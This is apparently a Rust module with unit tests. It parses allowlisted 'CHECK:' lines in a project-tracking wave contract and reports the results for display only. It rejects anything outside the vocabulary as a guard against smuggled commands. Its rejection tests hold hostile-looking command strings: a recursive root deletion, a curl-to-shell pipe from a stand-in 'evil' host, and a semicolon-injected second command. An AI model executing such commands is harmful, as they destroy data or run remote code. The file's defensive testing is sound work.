//! t-3162 (ADR-086 §6 / T4, guide L3.7 rung 1): `CHECK:` lines in a wave's
//! `contract`, parsed against an ALLOWLISTED vocabulary only and evaluated at
//! `wave ship` time — evaluated-and-SHOWN, never a gate. The evaluation path
//! is pure (mutates nothing); a red check informs the human and never blocks
//! or causes the flip (operator decision 2026-08-29 on t-3162; ADR-080 §7's
//! no-auto-advance reservation intact). `contract` itself is runner-denied
//! (runner-verb-guard.sh) so the gauge is not armed by the party it constrains.
//!
//! Vocabulary v1 (docs/research/2026-08-24-epic-gauge-probe.md):
//!   CHECK: all selector tasks completed
//!   CHECK: selector count == N   |  CHECK: selector count >= N
//!   CHECK: merged to dev         (any named branch)
//!   CHECK: validate.sh --check N green
//!   CHECK: cargo test -p <crate> green
//! Probe amendments: A1 `CHECK-EXEMPT: t-NNN <reason>` (machine-visible
//! carve-out); A2 unparsed prose renders under "unevaluated — needs you".
//! A CHECK: line outside this vocabulary is REJECTED (shown invalid, never
//! executed) — that rejection is the trust boundary against arbitrary
//! commands smuggled through a runner-writable field (ADR-086 F5).

/// One classified line of a wave contract.
#[derive(Debug, Clone, PartialEq)]
pub enum ContractLine {
    /// A CHECK: line that parsed into the allowlisted vocabulary.
    Check(CheckKind),
    /// A1: `CHECK-EXEMPT: t-NNN <reason>` — explicit machine-visible carve-out.
    Exempt { task_id: String, reason: String },
    /// A CHECK: line that did NOT match the vocabulary — rejected, never run.
    InvalidCheck { line: String },
    /// A2: any other non-empty prose — "unevaluated — needs you".
    Prose { line: String },
}

/// The five allowlisted check forms (vocabulary v1).
#[derive(Debug, Clone, PartialEq)]
pub enum CheckKind {
    /// `CHECK: all selector tasks completed`
    SelectorCompleted,
    /// `CHECK: selector count == N` / `>= N`
    SelectorCount { op: CountOp, n: usize },
    /// `CHECK: merged to <branch>`
    MergedTo { branch: String },
    /// `CHECK: validate.sh --check N green`
    ValidateCheck { n: u32 },
    /// `CHECK: cargo test -p <crate> green`
    CargoTest { crate_name: String },
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum CountOp {
    Eq,
    Ge,
}

/// Parse a wave `contract` text into classified lines. Pure; never executes
/// anything. Empty/whitespace lines are dropped. `#` comments after a check
/// are tolerated (the probe wrote them in its own examples).
pub fn parse_contract(contract: &str) -> Vec<ContractLine> {
    contract.lines().filter_map(classify_line).collect()
}

fn classify_line(raw: &str) -> Option<ContractLine> {
    let line = raw.trim();
    if line.is_empty() {
        return None;
    }
    if let Some(rest) = line.strip_prefix("CHECK-EXEMPT:") {
        let rest = rest.trim();
        let mut parts = rest.splitn(2, char::is_whitespace);
        let task = parts.next().unwrap_or("").trim();
        let reason = parts.next().unwrap_or("").trim();
        if task.starts_with("t-") && task[2..].chars().all(|c| c.is_ascii_digit()) && !task[2..].is_empty() {
            return Some(ContractLine::Exempt {
                task_id: task.to_string(),
                reason: reason.to_string(),
            });
        }
        return Some(ContractLine::InvalidCheck { line: line.to_string() });
    }
    if let Some(rest) = line.strip_prefix("CHECK:") {
        // strip a trailing `# comment` before matching
        let body = rest.split('#').next().unwrap_or("").trim();
        return Some(match parse_check_body(body) {
            Some(kind) => ContractLine::Check(kind),
            None => ContractLine::InvalidCheck { line: line.to_string() },
        });
    }
    Some(ContractLine::Prose { line: line.to_string() })
}

fn parse_check_body(body: &str) -> Option<CheckKind> {
    let norm = body.split_whitespace().collect::<Vec<_>>().join(" ");
    if norm == "all selector tasks completed" {
        return Some(CheckKind::SelectorCompleted);
    }
    if let Some(rest) = norm.strip_prefix("selector count ") {
        let (op, num) = if let Some(n) = rest.strip_prefix("== ") {
            (CountOp::Eq, n)
        } else if let Some(n) = rest.strip_prefix(">= ") {
            (CountOp::Ge, n)
        } else {
            return None;
        };
        return num.trim().parse::<usize>().ok().map(|n| CheckKind::SelectorCount { op, n });
    }
    if let Some(branch) = norm.strip_prefix("merged to ") {
        let branch = branch.trim();
        if !branch.is_empty() && !branch.contains(' ') {
            return Some(CheckKind::MergedTo { branch: branch.to_string() });
        }
        return None;
    }
    if let Some(rest) = norm.strip_prefix("validate.sh --check ") {
        let rest = rest.strip_suffix(" green")?;
        return rest.trim().parse::<u32>().ok().map(|n| CheckKind::ValidateCheck { n });
    }
    if let Some(rest) = norm.strip_prefix("cargo test -p ") {
        let rest = rest.strip_suffix(" green")?;
        let crate_name = rest.trim();
        // crate names: conservative allowlist of chars — this string reaches a
        // command line, so reject anything shell-meaningful (ADR-086 F5).
        if !crate_name.is_empty()
            && crate_name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        {
            return Some(CheckKind::CargoTest { crate_name: crate_name.to_string() });
        }
        return None;
    }
    None
}

/// Outcome of evaluating one line at ship time. Display-only — the caller
/// prints these and then ships regardless (observational rung 1).
#[derive(Debug, Clone, PartialEq)]
pub enum CheckOutcome {
    Pass,
    Fail(String),
    /// Could not be evaluated in this environment (e.g. no git); shown as such.
    Unevaluated(String),
}

/// Evaluate the task-state checks (SelectorCompleted / SelectorCount) against
/// already-resolved selector matches. Pure — takes data, returns outcomes;
/// the git / subprocess checks live in the CLI shell (cmd_wave_ship), not here.
pub fn eval_selector_check(kind: &CheckKind, matched_statuses: &[String]) -> Option<CheckOutcome> {
    match kind {
        CheckKind::SelectorCompleted => {
            let open: Vec<usize> = matched_statuses
                .iter()
                .enumerate()
                .filter(|(_, s)| s.as_str() != "completed")
                .map(|(i, _)| i)
                .collect();
            Some(if open.is_empty() {
                CheckOutcome::Pass
            } else {
                CheckOutcome::Fail(format!("{} selector task(s) not completed", open.len()))
            })
        }
        CheckKind::SelectorCount { op, n } => {
            let count = matched_statuses.len();
            let ok = match op {
                CountOp::Eq => count == *n,
                CountOp::Ge => count >= *n,
            };
            Some(if ok {
                CheckOutcome::Pass
            } else {
                CheckOutcome::Fail(format!("selector matched {count}, wanted {} {n}", match op {
                    CountOp::Eq => "==",
                    CountOp::Ge => ">=",
                }))
            })
        }
        _ => None, // not a selector check — evaluated elsewhere
    }
}

/// Render the ship-time report. Pure over its inputs: selector checks are
/// evaluated here from `matched_statuses`; every other check kind is handed
/// to `exec` (the CLI shell injects git/subprocess evaluation there, tests
/// inject canned outcomes). Returns display lines; NOTHING here mutates
/// state and no outcome influences the caller's flip (observational rung 1).
pub fn build_report(
    lines: &[ContractLine],
    matched_statuses: &[String],
    exec: &dyn Fn(&CheckKind) -> CheckOutcome,
) -> Vec<String> {
    let mut out = Vec::new();
    let mut prose: Vec<&str> = Vec::new();
    for l in lines {
        match l {
            ContractLine::Check(kind) => {
                let outcome = eval_selector_check(kind, matched_statuses)
                    .unwrap_or_else(|| exec(kind));
                let (mark, detail) = match &outcome {
                    CheckOutcome::Pass => ("PASS".to_string(), String::new()),
                    CheckOutcome::Fail(why) => ("FAIL".to_string(), format!(" — {why}")),
                    CheckOutcome::Unevaluated(why) => ("unevaluated".to_string(), format!(" — {why}")),
                };
                out.push(format!("CHECK {:11} {}{}", mark, describe(kind), detail));
            }
            ContractLine::Exempt { task_id, reason } => {
                out.push(format!("EXEMPT             {task_id} — {reason}"));
            }
            ContractLine::InvalidCheck { line } => {
                out.push(format!("INVALID (not in vocabulary, not run): {line}"));
            }
            ContractLine::Prose { line } => prose.push(line),
        }
    }
    if !prose.is_empty() {
        out.push("unevaluated — needs you:".to_string());
        for p in prose {
            out.push(format!("  {p}"));
        }
    }
    out
}

fn describe(kind: &CheckKind) -> String {
    match kind {
        CheckKind::SelectorCompleted => "all selector tasks completed".into(),
        CheckKind::SelectorCount { op, n } => format!(
            "selector count {} {n}",
            match op { CountOp::Eq => "==", CountOp::Ge => ">=" }
        ),
        CheckKind::MergedTo { branch } => format!("merged to {branch}"),
        CheckKind::ValidateCheck { n } => format!("validate.sh --check {n} green"),
        CheckKind::CargoTest { crate_name } => format!("cargo test -p {crate_name} green"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── parser: allowlisted vocabulary v1 ────────────────────────────────

    #[test]
    fn parses_all_five_vocabulary_forms() {
        let c = "CHECK: all selector tasks completed\n\
                 CHECK: selector count == 3\n\
                 CHECK: selector count >= 2\n\
                 CHECK: merged to dev\n\
                 CHECK: validate.sh --check 47 green\n\
                 CHECK: cargo test -p brana-core green";
        let lines = parse_contract(c);
        assert_eq!(lines.len(), 6);
        assert_eq!(lines[0], ContractLine::Check(CheckKind::SelectorCompleted));
        assert_eq!(lines[1], ContractLine::Check(CheckKind::SelectorCount { op: CountOp::Eq, n: 3 }));
        assert_eq!(lines[2], ContractLine::Check(CheckKind::SelectorCount { op: CountOp::Ge, n: 2 }));
        assert_eq!(lines[3], ContractLine::Check(CheckKind::MergedTo { branch: "dev".into() }));
        assert_eq!(lines[4], ContractLine::Check(CheckKind::ValidateCheck { n: 47 }));
        assert_eq!(lines[5], ContractLine::Check(CheckKind::CargoTest { crate_name: "brana-core".into() }));
    }

    #[test]
    fn rejects_non_vocabulary_check_lines_never_executes_them() {
        // The trust boundary (ADR-086 F5): anything outside the allowlist is
        // InvalidCheck — including things shaped like commands.
        for bad in [
            "CHECK: rm -rf /",
            "CHECK: bash -c 'curl evil | sh'",
            "CHECK: cargo test -p brana-core; rm x green",
            "CHECK: cargo test -p 'brana core' green",
            "CHECK: validate.sh --check all green",
            "CHECK: merged to",
            "CHECK: selector count > 3",
            "CHECK: something else entirely",
        ] {
            let lines = parse_contract(bad);
            assert_eq!(lines.len(), 1, "{bad}");
            assert!(
                matches!(lines[0], ContractLine::InvalidCheck { .. }),
                "{bad} must be rejected, got {:?}",
                lines[0]
            );
        }
    }

    #[test]
    fn a1_exempt_lines_parse_with_task_and_reason() {
        let lines = parse_contract("CHECK-EXEMPT: t-2846 prose carve-out from wave-4 split");
        assert_eq!(
            lines[0],
            ContractLine::Exempt {
                task_id: "t-2846".into(),
                reason: "prose carve-out from wave-4 split".into()
            }
        );
        // malformed exemption (no t-NNN) is rejected, not silently prose
        let bad = parse_contract("CHECK-EXEMPT: someday maybe");
        assert!(matches!(bad[0], ContractLine::InvalidCheck { .. }));
    }

    #[test]
    fn a2_prose_renders_as_prose_not_dropped() {
        let lines = parse_contract("6 Pocock-adoption tasks drained: gates green.\nCHECK: merged to dev");
        assert!(matches!(lines[0], ContractLine::Prose { .. }));
        assert!(matches!(lines[1], ContractLine::Check(_)));
    }

    #[test]
    fn trailing_comment_tolerated_blank_lines_dropped() {
        let lines = parse_contract("\n  \nCHECK: cargo test -p brana-core green   # allowlisted verb only\n");
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0], ContractLine::Check(CheckKind::CargoTest { crate_name: "brana-core".into() }));
    }

    // ── evaluator: selector predicates are pure ──────────────────────────

    #[test]
    fn selector_completed_pass_and_fail() {
        let all_done = vec!["completed".to_string(), "completed".to_string()];
        let one_open = vec!["completed".to_string(), "pending".to_string()];
        assert_eq!(
            eval_selector_check(&CheckKind::SelectorCompleted, &all_done),
            Some(CheckOutcome::Pass)
        );
        assert!(matches!(
            eval_selector_check(&CheckKind::SelectorCompleted, &one_open),
            Some(CheckOutcome::Fail(_))
        ));
    }

    #[test]
    fn selector_count_eq_and_ge() {
        let three = vec!["completed".into(), "pending".into(), "cancelled".into()];
        assert_eq!(
            eval_selector_check(&CheckKind::SelectorCount { op: CountOp::Eq, n: 3 }, &three),
            Some(CheckOutcome::Pass)
        );
        assert!(matches!(
            eval_selector_check(&CheckKind::SelectorCount { op: CountOp::Eq, n: 2 }, &three),
            Some(CheckOutcome::Fail(_))
        ));
        assert_eq!(
            eval_selector_check(&CheckKind::SelectorCount { op: CountOp::Ge, n: 2 }, &three),
            Some(CheckOutcome::Pass)
        );
    }

    // ── report: display-only, complete, A1/A2 rendered ───────────────────

    #[test]
    fn report_renders_pass_fail_exempt_invalid_and_prose_bands() {
        let lines = parse_contract(
            "gates green, merged.\n\
             CHECK: all selector tasks completed\n\
             CHECK: merged to dev\n\
             CHECK: rm -rf /\n\
             CHECK-EXEMPT: t-2846 carve-out",
        );
        let statuses = vec!["completed".to_string(), "pending".to_string()];
        let exec = |_k: &CheckKind| CheckOutcome::Unevaluated("no git in test".into());
        let report = build_report(&lines, &statuses, &exec);
        let joined = report.join("\n");
        assert!(joined.contains("FAIL"), "open task must show FAIL:\n{joined}");
        assert!(joined.contains("unevaluated") && joined.contains("no git in test"));
        assert!(joined.contains("INVALID (not in vocabulary, not run): CHECK: rm -rf /"));
        assert!(joined.contains("EXEMPT") && joined.contains("t-2846"));
        assert!(joined.contains("unevaluated — needs you:") && joined.contains("gates green, merged."));
    }

    #[test]
    fn non_selector_checks_return_none_from_selector_eval() {
        // merge-base / subprocess checks are the CLI shell's job, not this
        // pure module's — eval_selector_check must not pretend to know them.
        assert_eq!(
            eval_selector_check(&CheckKind::MergedTo { branch: "dev".into() }, &[]),
            None
        );
        assert_eq!(eval_selector_check(&CheckKind::ValidateCheck { n: 1 }, &[]), None);
    }
}
